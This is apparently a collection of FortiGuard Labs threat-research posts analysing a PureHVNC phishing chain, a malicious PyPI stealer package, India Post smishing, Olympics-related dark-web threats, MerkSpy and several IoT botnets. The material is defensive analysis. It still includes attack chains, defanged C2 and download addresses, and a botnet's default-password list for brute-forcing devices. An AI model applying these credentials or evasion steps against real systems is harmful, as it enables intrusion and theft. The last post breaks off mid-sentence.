    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High This past April, FortiGuard Labs uncovered a sophisticated attack that leveraged multiple layers of obfuscation and evasion techniques to distribute and execute VenomRAT via ScrubCrypt. However, this attack campaign didn’t end with VenomRAT, as the subsequently loaded plugin continued to deploy various types of malware into the victim’s environment. We recently identified a phishing campaign that also employs multiple layers of evasion techniques to deploy various malware into an infected environment. This campaign was aimed at employees and posed as a customer requesting a service. The email uses urgent language to deceive a victim into clicking a malicious attachment, initiating a series of harmful activities and deploying several types of malware. All the malware in this attack uses the same packing and obfuscation techniques, including a Python obfuscator, ‘Kramer,’ a shellcode generator, 'donut,' and a shellcode loader, 'laZzzy,' to conceal itself from detection. The deployed malware includes XWorm, Venom RAT, AsyncRAT, and PureHVNC. Figure 1 shows the attack chain. This threat report describes how this attack is delivered and analyzes the PureHVNC malware used in this campaign. The attack campaign starts with an email, shown in Figure 2. It implies that the inquiry email is from a customer and urges the recipient to open the attachment. This typical phishing email tactic uses job-related information and urgent language to deceive recipients into opening attachments or clicking links. The attachment is an HTML file that uses the “search-ms” functionality to query the “e_Statement” LNK file on remote file shares, as shown in Figure 3. Once the user opens the HTML file and clicks on “Open” to allow Windows Explorer to open, the malicious LNK file is shown in Windows Explorer and lures the user into executing it using a PDF icon. The LNK file contains a command to run a remote batch file using conhost.exe as the parent process. The attacker attempts to leverage the built-in Windows binary 'conhost.exe' for indirect execution to evade detection, as shown in Figure 4. This is an obfuscated batch file that hides the script by combining encoding tricks and string obfuscation. The file looks like UTF-16 encoding with Chinese characters because the bytes (FF FE) at the beginning can mislead a file editor into incorrectly detecting the encoding. Next, it performs a large number of character replacement operations with the specific charset. The de-obfuscation process is shown in Figures 5 and 6. The script begins by opening a decoy PDF file from the same remote file share. Next, it downloads two ZIP files via PowerShell, extracts all the content—including the Python Environment—into the folder \"%USERPOFILE%\\Downloads\\Python,\" sets the folder to hidden, and then runs the malicious Python program in sequence. Next, the decoy PDF is re-opened, initiating a persistence routine to download a second batch file and move it to the startup folder. The second ZIP file, used by the startup batch and containing several Python programs similar to those in the previous ZIP, is extracted to the “%USERPOFILE%\\Downloads\\Print” folder. Before completing all tasks, any unnecessary programs from subsequent tasks are removed. Each Python file is quite similar, as shown below. First, it imports a Base64 module to decode shellcode data and then decrypts it using an RC4 algorithm with a specific key. Finally, the code executes shellcode using an imported “ctypes” module. It should be noted that the RC4 key varies in each Python file. By tracking the same series of samples, we discovered a new Python shellcode loader. It's a compiled version of a Python file with an additional obfuscation layer added. The obfuscator, named \"Kramer,\" is available on GitHub, as shown in Figure 8. It obfuscates a Python file by encrypting the source code using an addition operation with a randomly generated key. The resulting obfuscated Python program combines the encrypted data with functions that limit the use of print and input commands, decode the encryption data, and execute the original source code. Finally, the program is compiled into a .pyc file and renamed with a .py extension. By extracting the key and encrypted data and following the decode function defined in the code, we obtained the source code. In this version, the code structure is similar, but the function names and variables are not obfuscated. The first shellcode primarily functions to decrypt and execute the next stage while bypassing AMSI/WLDP based on its configuration. The hack tool, \"donut,\" produces the shellcode, as shown in Figure 10. Once the decryption routine is completed, the decrypted data in memory reveals the flag, the APIs used for bypass mechanisms, and the entire PE file for the next stage, as seen in Figure 11. The second stage is a PE file that uses the Microsoft Management Console (MMC) icon, a built-in Windows program, to disguise itself as a regular application while functioning as an injector. This injector includes detailed debug information. As the program runs, each step of the injection process is displayed on the command line, as shown in Figure 12. We observed that a shellcode loader named \"laZzzy\" is publicly available on GitHub. It incorporates various execution techniques commonly used by malware and appears to be utilized in this stage for shellcode decryption, injection, and execution. Ultimately, the program uses the target and execution techniques selected by the attacker to inject the shellcode into notepad.exe and executes the shellcode via Early Bird APC Queue, as shown in Figure 13. The third stage involves a shellcode within notepad.exe, which is identical to the code found in the first shellcode. After decryption and bypassing AMSI/WLDP, the final payload is executed. In the next section, we will focus on PureHVNC, one of the malware identified in this attack campaign, along with additional plugins downloaded by the malware. We observed an unusual malware packed and obfuscated in the Remote Access Trojans (RAT) used in this attack campaign. It’s a .NET application containing a substantial block of built-in data. Its primary function is to decrypt its payload using the AES algorithm and then decompress it with the Gzip method. Once the DLL payload is extracted and loaded into memory, it employs its hard-coded class and method names to execute the payload's entry point, as shown in Figure 14. DLL Payload is protected by .NET Reactor, as seen in Figure 15. We partially de-obfuscated the program and renamed the functions. Its entry point was very easy to understand. After creating a mutex, the core function is then executed. In its core functionality, the program initially extracts the hardcoded configuration by performing base64 decoding followed by gzip decompression. Based on the flags in the configuration, it either sets the registry run key using PowerShell or prevents the system from sleeping by utilizing the Win32 API function, “SetThreadExecutionState,” as seen in Figure 16. Next, it attempts to communicate with the C2 server specified in the extracted configuration. Once the connection is established, it begins gathering victim information and reporting it to the C2 server, as shown in Figure 17. It abuses the Windows Management Instrumentation (WMI) system to gather information about the victim's system environment, including installed antivirus products, system and camera details, and user information. The VictimID is generated from the processor ID, disk serial number, memory serial number, and username. Additionally, the program searches for the paths of various extensions and applications based on a predefined list, as shown in Figures 18 and 19. Some applications also check the registry path to verify their installation. This list specifically targets crypto wallets, password managers, two-factor authenticators, and popular communication programs. After all the specified information is collected, it is sent to the C2 server to await further plugin loading. Figure 20 illustrates a method for handling incoming data from the C2 server after it has been preprocessed using gunzip and deserialization. When the program receives the plugin, it writes the plugin data and ID into the Windows Registry under the affected user’s HKEY_CURRENT_USER\\Software\\{VictimID}. The plugin data is then extracted, loaded into memory, and executed. Our analysis identified some details that helped us pinpoint the malware family. The same information appeared in the subsequently downloaded plugin, as seen below. In the following sections, we’ll elaborate on the plugins provided by the PureHVNC C2 server, which are obfuscated using the .NET Reactor. The initial plugin we received from the threat actor is a DLL file named “PluginRemoteDesktop.” As Figure 22 shows, its entry method is executed with the binary as a parameter to provide the module with C2 information. After extracting the C2 details, it communicates with the C2 server and executes the Remote Desktop function. Figure 23 shows one of the mouse-controlled functions and the APIs used by the RemoteDesktop program. PluginExecuting is a module responsible for executing additional files, updating the program, and even uninstalling malware. It follows a process similar to that of PluginRemoteDesktop at the entry point, using the C2 information extracted from parameters to communicate with the C2 server. It then waits to receive a packet to trigger the execution of the core function. The core function acts as a handler to process different commands based on their type. It supports six types of command, as illustrated in Table 1. Command Details DownloadAndExecuteDisk Execute a downloaded file DownloadAndUpdate Remove the current module and execute the downloaded file. UninstallConnection Delete the registry entry HKEY_CURRENT_USER\\Software\\{VictimID}, and remove the malware if it is not located in the %WINDOWS% folder. RestartConnection Start a new instance of the current module and terminate the existing process. CloseConnection Terminate the current process. DownloadAndExecuteMemory Run the downloaded payload in the designated process. Table 1: Commands PluginExecuting contains several important commands, particularly those related to downloading. Figure 24 illustrates the command used to create a hidden process that executes the downloaded file. These commands combine with a batch file to achieve both file deletion and execution, as shown in Figure 25. Additionally, theDownloadAndExecuteMemorycommand requires a binary and a target name as parameters. It injects the malicious binary into a specified target process using process hollowing and then resumes the injected process to execute the malicious code. Deploying multiple types of malware in an attack campaign is not unusual. In this case, the threat actor also uses complex, multilayer encryption to avoid detection across all the malware used in this campaign. In this article, we uncovered a phishing campaign targeting employees that employs a multi-stage execution flow and utilizes public hacking tools to evade detection. We also focused on one obfuscated payload, \"PureHVNC,\" detailing its functions and the additional plugins collected. Our observations indicate that it targets crypto wallets, password managers, and 2FA authenticators. Finally, it can carry out further attacks using its RemoteDesktop and Executing plugins.

    "title": "Malicious Packages Hidden in PyPI",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-packages-hidden-in-pypl",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High The FortiGuard Labs team has identified a malicious PyPI package affecting all platforms where PyPI packages can be installed. This discovery poses a significant risk to individuals and institutions that have installed these packages, potentially leading to the leakage of credentials and sensitive information. Given the high severity of this threat, it is crucial to focus on this specific PyPI package. This report discusses its potential impacts and emphasizes the importance of diligent security practices in managing software dependencies. On July 3, the Fortinet AI-driven OSS malware detection system identified a malicious package named zlibxjson version 8.2, published on June 29, 2024. This package contained a malicious URL that downloaded various files, including an executable (.exe) file packed with PyInstaller. The .exe file was unpacked to retrieve .pyc files, which were then decompiled into Python (.py) files. Among the numerous Python and DLL files discovered, three were particularly problematic: Discord_token_grabber.pyget_cookies.pypassword_grabber.py. These files are designed to steal sensitive information, such as Discord tokens, browser cookies, and stored passwords. We examine each of these files in the following sections. The provided code is malicious for several reasons, but primarily because it aims to steal sensitive information from Discord users and send it to an external server controlled by the attacker. 1. Token Extraction: The code extracts Discord tokens from the user's local machine by searching for patterns that match token formats in local files. Tokens are used to authenticate users with Discord’s API. Stealing these tokens allows an attacker to gain unauthorized access to the victim's Discord account. The class `extract_tokens` performs this search in local application data directories using regular expressions. The tokens are then validated and decrypted if necessary. 2. Decryption of Stored Data: The code includes functionality to decrypt stored passwords and tokens using the system's master key. This allows the attacker to access sensitive data stored securely by the system. 3. Data Exfiltration: The code sends the extracted tokens and other user information to the attacker's server by making HTTP requests to Discord's API endpoints. It gathers user profile information, billing details, guild memberships, and gift codes. The collected data is then formatted and sent to an external server, enabling the attacker to use or sell the stolen information. The `fetch_tokens` class collects this wide range of information using the stolen tokens. 4. Persistence and Evasion: The code includes retry mechanisms and various methods to ensure it can continue its operations even if some attempts fail. The collected data is then formatted and sent to an external server or presented in a format that can be easily sent to the attacker. This file includes some critical malicious activities, including cookies theft, decryption of stored data, and data exfiltration, 1. Cookie Theft: The code's primary purpose is to steal cookies from various web browsers, such as Chrome, Firefox, Brave, and Opera. Cookies often contain sensitive information like session tokens, login credentials, and other personal data. The code also accesses and copies browser data directories without user consent, indicating a clear malicious intent. 2. Decryption of Stored Data: The code decrypts stored cookies using the system's master key, which is extracted from the browser's local state files. This involves decrypting data that is typically securely stored. It unlocks encrypted cookie data, bypassing security mechanisms that protect user information. 3. Data Exfiltration: The decrypted cookies are saved to a file named `cookies.txt` located in the user's directory (`C:\\\\Users\\\\{getuser()}\\\\cookies.txt`), a tactic commonly used to collect and later exfiltrate sensitive data. This indicates an intent to gather and potentially transfer sensitive information. Additionally, the code creates temporary directories and files, possibly to hide its activities and ensure persistence. The provided code is malicious. It is designed to steal saved passwords from web browsers, specifically Google Chrome and Microsoft Edge, and decrypt them for unauthorized access. Here's a detailed analysis of why this code is malicious: Detailed Analysis: The functions `get_passwords_edge()` and `main()` access the databases where Chrome and Edge store login data to extract encrypted passwords. The code copies the `Login Data` file used by Chrome and Edge to a local file (`ChromeData.db`) to read its contents without locking issues. After extracting the encrypted passwords, the code decrypts them using the browser's encryption key. The extracted and decrypted data, including URLs, usernames, and passwords, are stored in a dictionary that can be sent to an attacker or saved for misuse. The code then removes the copied database file to clean up traces. Specific malicious elements include unauthorized access to browser data directories, decryption of sensitive data, and the potential exfiltration of collected passwords to an external server or attacker-controlled location. The identified malicious packages in PyPI are designed to steal sensitive information by accessing and decrypting stored data from web browsers, such as passwords and cookies. These actions can lead to unauthorized access to user accounts and the exfiltration of personal data, clearly classifying the software as malicious. It is crucial to remain vigilant and use detection systems like AI-driven OSS malware detection to identify and mitigate such threats, ensuring user privacy and security are maintained.

    "title": "Phishing Campaign Targeting Mobile Users in India Using India Post Lures",
    "link": "https://www.fortinet.com/blog/threat-research/phishing-campaign-targeting-mobile-users-in-india-using-india-post-lures",
    "content": "FortiGuard Labs Threat Research Impacted Users:iPhone users in IndiaImpact:Possible financial loss; stolen information can be used for future attacksSeverity Level:Medium The FortiGuard Labs Threat Research team recently observed a number of social media posts commenting on a fraud campaign targeting India Post users. India Post is India’s government-operated postal system. It is part of the Ministry of Communications and has a vast network of over 150,000 post offices across the country, making it one of the largest postal systems in the world. In this campaign, iPhone users are being targeted by smishing attacks claiming to be from India Post. This scam involves sending an iMessage to iPhone users that falsely claims that a package is waiting at an India Post warehouse. Publicreportingsuggests this campaign is being attributed to a China-based threat actor known as theSmishing Triad. This group has previously targeted other regions, including the US, UK, EU, UAE, KSA, and, most recently, Pakistan. We have observed third-party email addresses such as Hotmail, Gmail, or Yahoo being used in phishing emails on iMessage. Apple allows users to create an Apple ID using these third-party email addresses as the primary email associated with their Apple ID. Once the Apple ID is created and configured for iMessage, the sender can use that third-party email address to send messages through iMessage. The messages often contain a short URL, leading to a fraudulent website. Upon investigation, we discovered a significant number of newly registered domains being used for current and potential phishing scams. This blog highlights the tools and methods used to propagate such phishing campaigns and explores the scale of these operations, the tactics employed by threat actors, and other relevant insights. Between January and July 2024, we found over 470 domain registrations mimicking India Post's official domain. Among these, 296 domains were registered via the Chinese registrarBeijing Lanhai Jiye Technology Co., Ltd.,followed by 152 registrations through Namesilo, an American domain registrar. The notable concentration of registrations through a Chinese registrar certainly raises substantial concerns about the underlying intentions. This activity exemplifies ahomograph phishing attack, where domain names are created to look visually similar to legitimate ones. The most frequently used top-level domains (TLDs) include 'vip' (200 registrations), 'top' (81 registrations), and 'buzz' (40 registrations). The registration cost per domain varies: 'vip' TLDs typically range from USD 4 to USD 5 per domain, whereas 'top' TLDs cost between USD 1 and USD 2 per domain. To calculate the total investment: Our analysis revealed that Tencent, a Chinese hosting service provider, hosts a significant number of these domains (232). Additionally, Tencent hosts 16 domains registered in Santa Clara. Further analysis revealed that 262 domain names point to the IP address 119.28.68[.]187, also hosted onTencent's servers. When investigating the phishing domain 'indiapost[.]top,' which impersonates India Post through a cloned copy of the original website, it was discovered that the domain does not host any content. Instead, specific paths on the domain are utilized to host the phishing website that impersonates India Post. While the domain name was registered on 28th November 2023, it is now actively being used in their operations. It is now likely to evade detection by antivirus engines as domains typically gain reputation over time. The phishing site (on the left) is an identical copy of the original India Post website (on the right). Continuing as a regular user, the fraudsters collect sensitive information such as name, full residential address, email ID, and phone number. This information can be leveraged in future operations for further scams, sending phishing emails, spreading disinformation/misinformation, or distributing malware. On the next page, the fraudulent site requests debit/credit card information for a payment of INR 25.02, claiming it is a charge for redelivering the package. The threat actors begin by sending a message via iMessage directly to the recipients' registered Apple ID email addresses. The sender ID could be a newly registered Apple ID or a compromised account. This method ensures that the message appears within the recipient's Messages app as an iMessage, distinct from traditional email communications, provided both parties use iMessage-enabled devices and have their Apple IDs configured for iMessage. The investment in registering these domain names alone exceeds USD 1500, not to mention additional costs for hosting and development. This significant investment highlights the threat actors' commitment, the phishing operation's scale, and its potential long-term impact. As a result, we feel that the likelihood of numerous victims falling prey to these scams is increased, leading to substantial financial losses, data breaches, and other security issues for individuals and organizations targeted by these domains. This operation may also serve as a strategic initiative to raise funds to fuel operations in China. Because of this, awareness and proactive measures are crucial to mitigating the risks posed by these phishing activities. The suspicious domains used in the campaign described in this report are detected and blocked by FortiGuard URL Filtering Service, utilized by FortiGate, FortiClient, and FortiMail, as: WebFilter:Phishing WebFilter:Spam URLs FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks.

    "title": "Dark Web Shows Cybercriminals Ready for Olympics. Are You?",
    "link": "https://www.fortinet.com/blog/threat-research/dark-web-shows-cybercriminals-ready-for-olympics",
    "content": "FortiGuard Labs Threat Research Major sporting events like the World Cup, Super Bowl, and Wimbledon attract millions, even billions, of viewers. Argentina’s shootout win over France in the final game of the Qatar 2022 World Cup reached a global audience of 1.5 billion viewers. And the Olympics, starting later this month in Paris, is the biggest of them all—with the 2020 Tokyo Olympics having attracted a worldwide audience of over 3 billion viewers. These events are also prime opportunities for cybercriminals. Over the past decade, the number of cyberattacks targeting major events has surged, increasing from 212 million documented attacks at the London 2012 Games to a staggering 4.4 billion at the Tokyo 2020 Games. These attacks often have direct financial motives, such as scams, digital fraud, or the acquisition of valuable data from attendees, viewers, and sponsors. In their excitement, eager fans often overlook potential risks when purchasing tickets, arranging accommodations, or buying memorabilia, making them easy targets for cybercriminals. Others, desperate to view specific events, are enticed by malicious websites offering free access, only to have their devices compromised or personal data stolen. And with the world’s media focused on the event, criminals with a political agenda are looking for a large audience for their message by disrupting a significant site or knocking critical services offline. According to a new FortiGuard Labs analysis based on threat intelligence provided byFortiRecon, this year’s Olympics have been a target for a growing number of cybercriminals for over a year. Using publicly available information and proprietary analysis, this report provides a comprehensive view of planned attacks, such as third-party breaches, infostealers, phishing, and malware, including ransomware. To download the full FortiGuard Labs report, visithere. FortiGuard Labs has observed a significant increase in resources being gathered for the Paris Olympic Games, especially those targeting French-speaking users, French government agencies and businesses, and French infrastructure providers. Beginning the second half of 2023, we saw a surge in darknet activity targeting France. This 80% to 90% increase has remained consistent across 2H 2023 and 1H 2024. The prevalence and sophistication of these threats are a testament to cybercriminals’ planning and execution, with the dark web serving as a hub for their activities. Documented activities include the growing availability of advanced tools and services designed to accelerate data breaches and gather personally identifiable information (PII), the sale of stolen credentials and compromised VPN connections to enable unauthorized access to private networks, and advertisements for phishing kits and exploit tools customized for the Paris Olympics. It also includes the sale of French databases that contain sensitive personal information, such as full names, dates of birth, government identification numbers, email addresses, phone numbers, residential addresses, and other PII, as well as combo lists (a collection of compromised usernames and passwords used for automated brute-force attacks) composed of French citizens. Given that Russia and Belarus are not invited to this year’s games, we have also seen a spike in hacktivist activity by pro-Russian groups—like LulzSec, noname057(16), Cyber Army Russia Reborn, Cyber Dragon, and Dragonforce—that specifically call out that they’re targeting the Olympic games. Groups from other countries and regions are also prevalent, including Anonymous Sudan (Sudan), Gamesia Team (Indonesia), Turk Hack Team (Turkey), and Team Anon Force (India). Phishing kits:While phishing is perhaps the easiest form of attack, many low-sophistication cybercriminals don’t know how to create or distribute phishing emails. Phishing kits provide novice attackers with a simple user interface that helps them compose a convincing email, add a malicious payload, create a phishing domain, and procure a list of potential victims. The addition of text-generating AI services has also eliminated the spelling, grammatical, and graphical errors that allow recipients to detect an email as malicious. The FortiGuard Labs team has also documented a significant number of typosquatting domains registered around the Olympics, including variations on the name (oympics[.]com, olmpics[.]com, olimpics[.]com, and others). These are combined with cloned versions of the official ticket website that take you to a payment method where you don’t get a ticket, and your money is gone. In collaboration with Olympic partners, the French Gendarmerie Nationale hasidentified 338 fraudulent websitesclaiming to sell Olympic tickets. According to their data, 51 sites have been shut down, and 140 have received formal notices from law enforcement. Similarly, several Olympic Games–themed lottery scams have been identified, with many impersonating major brands such as Coca-Cola, Microsoft, Google, the Turkish National Lottery, and the World Bank. The primary targets for these lottery scams are users in the U.S., Japan, Germany, France, Australia, the U.K., and Slovakia. We have also seen an increase in coding services for creating phishing websites and associated live panels, bulk SMS services to enable mass communication, and phone number spoofing services. These offerings can facilitate phishing attacks, spread misinformation, and disrupt communications by impersonating trusted sources, potentially causing significant operational and security challenges during the event. Infostealers:Information stealer malware is designed to stealthily infiltrate a victim’s computer or device and harvest sensitive information, such as login credentials, credit card details, and other personal data. We have also observed that threat actors are deploying various types of stealer malware to infect user systems and obtain unauthorized access. Threat actors and initial access brokers can further leverage this information to execute ransomware attacks, causing substantial harm and financial loss to individuals and organizations. Our data indicates that Raccoon is currently the most active infostealer in France, accounting for 59% of all detections. Raccoon is an effective and inexpensive Malware-as-a-Service (MaaS) sold on dark web forums. It steals browser autofill passwords, history, cookies, credit cards, usernames, passwords, cryptocurrency wallets, and other sensitive data. It is followed by Lumma (another subscription-based MaaS) at 21% and Vidar at 9%. In addition to celebrating athleticism and sportsmanship, the Paris Olympics 2024 is a high-stakes cyberthreat target, drawing attention from cybercriminals, hacktivists, and state-sponsored actors. Cybercriminals are leveraging phishing scams and fraudulent schemes to exploit unsuspecting participants and spectators. Fake ticketing platforms, fraudulent merchandise, and identity theft tactics threaten financial loss and undermine public trust in event-related transactions. Further, due to France’s political stances and international influence, the Paris Olympics 2024 is also a prime target for politically motivated groups. We anticipate that hacktivist groups will focus on entities associated with the Paris Olympics to disrupt the event, targeting infrastructure, media channels, and affiliated organizations to disrupt event proceedings, undermine credibility, and amplify their messages on a global stage.

    "title": "MerkSpy: Exploiting CVE-2021-40444 to Infiltrate Systems",
    "link": "https://www.fortinet.com/blog/threat-research/merkspy-exploiting-cve-2021-40444-to-infiltrate-systems",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Spyware is malicious software engineered to covertly monitor and gather information from a user’s computer without their awareness or consent. It can record activities like keystrokes, browsing behavior, and personal information, often transmitting this data to a third party for espionage or theft. FortiGuard Labs recently detected an attack exploiting the CVE-2021-40444 vulnerability in Microsoft Office. This flaw allows attackers to execute malicious code via specially crafted documents. In this instance, the exploitation led to the deployment of a spyware payload known as “MerkSpy.” MerkSpy is designed to clandestinely monitor user activities, capture sensitive information, and establish persistence on compromised systems. This blog will dissect the stages of this complex attack, offering insights into the techniques used by cybercriminals to infiltrate systems and steal sensitive data. The initial vector for this attack is a deceptive Microsoft Word document posing as a job description for a software developer position. Opening the document triggers the exploitation of CVE-2021-40444, a remote code execution vulnerability within the MSHTML component used by Internet Explorer in Microsoft Office. This vulnerability permits an attacker to execute arbitrary code on a victim’s machine without additional user interaction beyond opening the document. The attacker conceals the URL within the “\\_rels\\document.xml” file. It directs to hxxp://45[.]89[.]53[.]46/google/olerender[.]html, downloading an HTML file that sets the stage for the next phase of the attack. After the successful exploitation, the malicious document initiates the downloaded payload, “olerender.html,” from a remote server. This HTML file is strategically crafted, with innocuous script filling the beginning to mask its true intent. The end of the file conceals the shellcode and injection process, which propels the attack forward when executed on the victim’s machine. “olerender.html” first checks the system’s OS version. If it detects an X64 architecture, it extracts the embedded “sc_x64” shellcode. After determining the OS version and extracting the appropriate shellcode, “olerender.html” locates and retrieves the Windows APIs “VirtualProtect” and “CreateThread.” These functions are crucial for the following steps: it leverages “VirtualProtect” to modify memory permissions, allowing the decoded shellcode to be written into memory securely. Following this, “CreateThread” executes the injected shellcode, setting the stage for downloading and executing the next payload from the attacker’s server. This process ensures that the malicious code runs seamlessly, facilitating further exploitation. Once the shellcode is in place, it functions as a downloader, initiating the next phase of the attack. It reaches out to the same remote server to fetch a file, deceptively named “GoogleUpdate.” Despite its seemingly innocuous name, “GoogleUpdate” is far from benign. This file harbors the core malicious payload, which is deeply encoded to evade detection by standard security measures. Upon successful download, the shellcode meticulously decodes and prepares this payload for execution. Once “GoogleUpdate” is downloaded, the shellcode decodes the file using an XOR key of 0x25021420 and an increment value of 0x00890518. This decryption process is crucial as it extracts the concealed actual payload embedded within the file. By employing these specific cryptographic techniques, the shellcode ensures that the malicious content remains hidden, allowing the attacker to execute their intended operations on the compromised system effectively. The extracted payload is protected with VMProtect. Its primary function is seamlessly injecting the MerkSpy spyware into crucial system processes. MerkSpy spyware operates covertly within a system, enabling it to capture sensitive information, monitor user activities, and exfiltrate data to remote servers controlled by malicious actors. MerkSpy achieves persistence by masquerading as “Google Update,” adding a registry entry for “GoogleUpdate.exe” in “Software\\Microsoft\\Windows\\CurrentVersion\\Run.” This deceptive tactic ensures that MerkSpy launches automatically at system startup, enabling continuous operation and data exfiltration without the user’s knowledge or consent. Following its installation, MerkSpy initiates the exfiltration process and begins monitoring specific targets: capturing screenshots, logging keystrokes, retrieving Chrome login credentials, and accessing the MetaMask extension. Once it gathers this data, MerkSpy uploads the collected information to the attacker’s server through the URL hxxp://45[.]89[.]53[.]46/google/update[.]php. The POST request employs a user agent string of “WINDOWS” and uses a fixed boundary, “---------------------------update request,” indicating it is a multi-part form-data submission. The request body is comprised of multiple parts: Based on telemetry from the C2 server at “45[.]89[.]53[.]46,” a significant activity spike began at the end of May, primarily targeting North America and India. The initial phase of the attack leverages a vulnerability in the MSHTML component used by Internet Explorer. Upon exploitation, it initiates the download of a file named “olerender.html,” which contains JavaScript and embedded shellcode. This shellcode decodes the downloaded content to execute an injector responsible for loading the MerkSpy spyware into memory and integrating it with active system processes. MerkSpy is capable of sophisticated surveillance activities, including keystroke logging, screenshot capture, and harvesting Chrome browser login data. By understanding the intricacies of this attack chain, organizations can enhance their readiness and deploy effective defenses against such intrusions.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Linux DistributionsImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Cybersecurity threats are increasingly leveraging cloud services to store, distribute, and establish command and control (C2) servers, such asVCRUMSstored on AWS orSYK Crypterdistributed via DriveHQ. This shift in strategy presents significant challenges for detection and prevention, as cloud services provide scalability, anonymity, and resilience that traditional hosting methods lack. Over the past month, FortiGuard Labs has been monitoring botnets that have adopted this strategy, abusing cloud services to enhance their malicious capabilities. These botnets, such as UNSTABLE and Condi, have been observed leveraging cloud storage and computing services operators to distribute malware payloads and updates to a broad range of devices. Using cloud servers for C2 operations ensures persistent communication with compromised devices, making it harder for defenders to disrupt an attack. We have also observed a threat actor exploiting multiple vulnerabilities to target JAWS webservers, Dasan GPON home routers, Huawei HG532 routers, TP-Link Archer AX21, and Ivanti Connect Secure to amplify their attacks. In this article, we will detail this threat actor's initial attack method and further explore the botnets being used. Initial access by the UNSTABLE Botnet targets the JAWS Webserver RCE vulnerability, CVE-2016-20016, and retrieves the downloader script “jaws” from 45[.]128[.]232[.]15. It includes multiple binary files for 13 architectures executed using the parameter “jaws.exploit.” The UNSTABLE Botnet is a Mirai variant that uses XOR to encode its configuration. It has three main modules: exploitation, scanner, and DDoS attack. The exploitation module targets three vulnerabilities: CVE-2016-20016, CVE-2018-10561/10562, and CVE-2017-17215. The scanner module includes a hard-coded list of usernames and passwords that it uses for brute-force scanning of other endpoints in the network. root Zte521 swsbzkgn taZz@23495859 grouter juantech tsgoingon telnet pass solokey oelinux123 password admin tl789 svgodie default GM8182 t0talc0ntr0l4! user hunt5759 zhongxing guest telecomadmin zlxx. telnetadmin twe8ehome zsun1188 1111 h3c xmhdipc 12345 nmgx_wapia klv123 123456 private hi3518 54321 abc123 7ujMko0vizxv 88888888 ROOT500 7ujMko0admin 20080826 ahetzip8 dreambox 666666 anko system 888888 ascend iwkb 1001chin blender realtek xc3511 cat1029 00000000 vizxv changeme 12341234 5up iDirect huigu309 jvbzd nflection win1dows hg2x0 ipcam_rt5350 antslq Figure 5: Scanner module and hard-coded username/password The DDoS attack module is a typical list that covers several protocols. The UNSTABLE botnet contains nine methods: attack_tcp_ack, attack_tcp_syn, attack_tcp_legit, attack_tcp_sack2, attack_udp_plain, attack_udp_vse, attack_udp_thread, attack_gre_ip, and attack_method_nudp. The botnets can choose the appropriate method based on commands from its C2 server. FortiGuard Labspreviously disclosedthe Condi DDoS botnet, which continues to exploit CVE-2023-1389 to gain control of devices and execute its malicious activities. The binary file is hosted on “45[.]128[.]232[.]90” for distribution. Once a device is infected, the malware kills off the competition and specific processes. It then sets up a connection to a central Command and Control (C2) server, “trembolone[.]zapto[.]org.” FortiGuard Labs noticed the incident as the payload “ping -c 20 209.141.35.56,” which seemed unusual within such an attack. Since the IP address is neither the attack source nor the destination intranet, we suppose these two IP addresses, 45[.]128[.]232[.]229 and 209[.]141[.]35[.]56, might be controlled by the attacker simultaneously and one of them is a command and control (C2) server. The attack source IP address, “45[.]128[.]232[.]229,” has four files named “msgbox.exe,” “udp,” “udparm,” and “udpmips,” respectively. These are DoS tools for different Linux architectures, except “msgbox.exe,” which pops up a message box with the string “RAT.” The following analysis examines the “udp” file. The tool has an unmistakable usage message, “Usage: %s <IP> <SECONDS> [PORT],” while executing without any arguments. When executing with the necessary “IP” and “SECONDS” arguments, the tool triggers a UDP flooding DoS attack using system-generated random characters. The IP address “209[.]141[.]35[.]56” pinged by the compromised device is exploited by the attack source IP address “45[.]128[.]232[.]229” using the CVE-2023-1389 vulnerability. It was first met with a page that the FBI has seized due to its use as a DDoS service (Figure 12). However, FortiGuard Labs found the IP address also has another route, “hxxp://209[.]141[.]35[.]56/getters/,” which contains 19 malware variants for different Linux architectures. (see Figure 13) aarch64 microblazebe aarch64be microblazeel arcle-750d mips arcle-hs38 mipsel armv4l nios2 armv5l openrisc armv6l powerpc armv7l riscv64 i586 sh4 m68k sparc m68k-68xxx x86_64-core-i7 m68k-coldfire x86-core2 m68k-coldfire.gdb x86-i686 xtensa-lx60 Figure 13: The malware for different Linux architectures We focus on analyzing the file for architecture “x86-i686.” The malware creates a socket and checks whether the C2 server is valid. If not, it terminates the program. If the server is confirmed reachable, the malware sets up a connection with C2 server “45[.]128[.]232[.]229,” which is the exploit CVE-2023-1389 source IP address, executes the “ps” command, and gathers process-related output information. The malware executes the command “ps -eo pid,comm --no-headers” through “/bin/bash” to get all process PIDs (Process IDs) and command names running without a header line. It then leverages the obtained PIDs (Process IDs) to further check the commands of those executing processes using “/proc/<PID>/comm.” Afterward, the malware sends related information to the C2 server. According to our analysis, the attackers seem to have a cloud command and control (C2) server (45[.]128[.]232[.]229) and a network-attached malware storage (209[.]141[.]35[.]56). The attacker first checks to see if the leveraged device can reach the network-attached malware storage to download malware and execute the following attack stages. This malware, which we named “Skibidi,” was spread by the attacker using two different vulnerabilities simultaneously. One is CVE-2023-1389 in TP-Link Archer AX21, which botnets have continuously exploited since it was launched, asdetailed in the reportproduced by FortiGuard Lab. The other is CVE-2024-21887 in Ivanti Connect Secure, which caused a sensation in April 2024. Attackers first download the “Skibidi” malware with a downloader script. It downloads and executes each malware to determine the proper Linux architecture attack. arm4 mips arm5 mipsel arm6 ppc arm7 sh4 x86_64 Figure 